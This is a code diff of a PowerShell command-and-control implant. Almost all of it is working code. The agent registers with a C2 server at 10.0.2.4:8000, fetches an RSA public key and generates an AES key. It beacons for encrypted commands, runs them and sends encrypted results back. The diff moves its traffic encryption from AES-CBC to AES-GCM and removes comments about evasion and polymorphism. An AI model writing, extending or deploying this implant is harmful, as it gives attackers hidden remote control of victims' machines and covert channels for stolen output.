@@ -8,12 +8,13 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 #########################################################################################################################################################################################################################$ErrorActionPreference = "Stop"
 
+$ErrorActionPreference = "Stop"
+
 # Function to load or generate AgentID
 Function Load-AgentID {
     Param ([string]$FilePath)
     If (Test-Path $FilePath) {
-        $AgentID = (Get-Content $FilePath -Raw).Trim()
-        return $AgentID
+        return (Get-Content $FilePath -Raw).Trim()
     } Else {
         $AgentID = [guid]::NewGuid().ToString()
         Set-Content -Path $FilePath -Value $AgentID
@@ -21,9 +22,48 @@ Function Load-AgentID {
     }
 }
 
-# Function to send beacon to C2 server with time-based evasion
+# Function to encrypt using AES-GCM
+Function Encrypt-Result-GCM {
+    Param ([string]$PlainText, [byte[]]$AESKey)
+
+    $Nonce = New-Object byte[] 12  # 96-bit Nonce
+    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($Nonce)
+
+    $AEAD = New-Object Security.Cryptography.AesGcm($AESKey)
+    $PlainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
+    $CipherText = New-Object byte[] $PlainTextBytes.Length
+    $Tag = New-Object byte[] 16  # 128-bit authentication tag
+
+    $AEAD.Encrypt($Nonce, $PlainTextBytes, $CipherText, $Tag)
+
+    return [Convert]::ToBase64String($Nonce + $Tag + $CipherText)
+}
+
+# Function to decrypt using AES-GCM
+Function Decrypt-Result-GCM {
+    Param ([string]$CipherTextBase64, [byte[]]$AESKey)
+
+    $CipherData = [Convert]::FromBase64String($CipherTextBase64)
+    $Nonce = $CipherData[0..11]
+    $Tag = $CipherData[12..27]
+    $CipherText = $CipherData[28..($CipherData.Length - 1)]
+
+    $AEAD = New-Object Security.Cryptography.AesGcm($AESKey)
+    $PlainTextBytes = New-Object byte[] $CipherText.Length
+
+    Try {
+        $AEAD.Decrypt($Nonce, $CipherText, $Tag, $PlainTextBytes)
+        return [System.Text.Encoding]::UTF8.GetString($PlainTextBytes)
+    } Catch {
+        Write-Host "[-] Decryption failed: Integrity check failed!"
+        return $null
+    }
+}
+
+# Function to send beacon
 Function Send-Beacon {
     Param ([string]$AgentID, [string]$C2Url, [byte[]]$AESKey)
+
     Try {
         $Body = @{ AgentID = $AgentID } | ConvertTo-Json -Compress
         $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)
@@ -32,15 +72,7 @@ Function Send-Beacon {
         $Response = Invoke-RestMethod -Uri "$C2Url/beacon" -Method POST -Body $Body -ContentType "application/json; charset=utf-8"
         $EncryptedCommand = $Response.data
 
-        $AES = New-Object System.Security.Cryptography.AesManaged
-        $AES.Key = $AESKey
-        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-        $CommandBytes = [Convert]::FromBase64String($EncryptedCommand)
-        $IV = $CommandBytes[0..15]
-        $CipherText = $CommandBytes[16..($CommandBytes.Length - 1)]
-        $Decryptor = $AES.CreateDecryptor($AES.Key, $IV)
-        $Command = [System.Text.Encoding]::UTF8.GetString($Decryptor.TransformFinalBlock($CipherText, 0, $CipherText.Length))
+        $Command = Decrypt-Result-GCM -CipherTextBase64 $EncryptedCommand -AESKey $AESKey
 
         If ($Command -ne "NoCommand") {
             Write-Host "[*] Executing command: $Command"
@@ -56,17 +88,9 @@ Function Send-Beacon {
 # Function to send execution result
 Function Send-Result {
     Param ([string]$AgentID, [string]$C2Url, [string]$Result, [byte[]]$AESKey)
+
     Try {
-        $AES = New-Object System.Security.Cryptography.AesManaged
-        $AES.Key = $AESKey
-        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-        $Encryptor = $AES.CreateEncryptor()
-        $ResultBytes = [System.Text.Encoding]::UTF8.GetBytes($Result)
-        $CipherText = $Encryptor.TransformFinalBlock($ResultBytes, 0, $ResultBytes.Length)
-        $IV = $AES.IV
-        $EncryptedResult = [Convert]::ToBase64String($IV + $CipherText)
-        
+        $EncryptedResult = Encrypt-Result-GCM -PlainText $Result -AESKey $AESKey
         $Body = @{ AgentID = $AgentID; Result = $EncryptedResult } | ConvertTo-Json -Compress
         $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)
 
@@ -77,25 +101,28 @@ Function Send-Result {
     }
 }
 
+# Function to import RSA key
+Function Import-RSAKey {
+    Param ([string]$PublicKeyXML)
+    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
+    $rsa.FromXmlString($PublicKeyXML)
+    return $rsa
+}
+
 # Main execution
 Try {
     $AgentIDFilePath = "C:\Temp\agent_id.txt"
     $AgentID = Load-AgentID -FilePath $AgentIDFilePath
-    $C2Url = "http://c2_ip_or_URL:8000"
+    $C2Url = "http://10.0.2.4:8000"
 
     Write-Host "[*] Fetching Public Key..."
     $PublicKeyResponse = Invoke-RestMethod -Uri "$C2Url/public_key" -Method GET
     If (-Not $PublicKeyResponse.PublicKey) { Throw "[-] Failed to retrieve public key" }
     $PublicKeyXML = $PublicKeyResponse.PublicKey
 
-    Function Import-RSAKey ($PublicKeyXML) {
-        $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
-        $rsa.FromXmlString($PublicKeyXML)
-        return $rsa
-    }
-    $RSA = Import-RSAKey $PublicKeyXML
+    $RSA = Import-RSAKey -PublicKeyXML $PublicKeyXML
 
-    # Generate AES Key with polymorphic behavior
+    # Generate AES Key
     $AESKey = New-Object byte[] 32
     [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($AESKey)
     $AESKeyBase64 = [Convert]::ToBase64String($AESKey)
